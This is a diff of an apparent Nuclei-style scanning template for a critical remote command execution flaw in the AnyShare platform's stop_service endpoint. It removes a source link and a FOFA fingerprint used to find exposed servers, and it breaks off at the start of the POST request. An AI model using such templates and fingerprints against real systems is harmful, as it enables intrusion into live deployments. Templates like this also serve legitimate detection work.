@@ -3,12 +3,8 @@ info:
   name: 爱数 AnyShare智能内容管理平台 stop_service 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/olv32k7r403c6hti'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: olv32k7r403c6hti
-    fofa: body="/libs/hls.js/dist/hls.min.js"
 http:
 - raw:
   - 'POST /api/ServiceAgent/stop_service HTTP/1.1
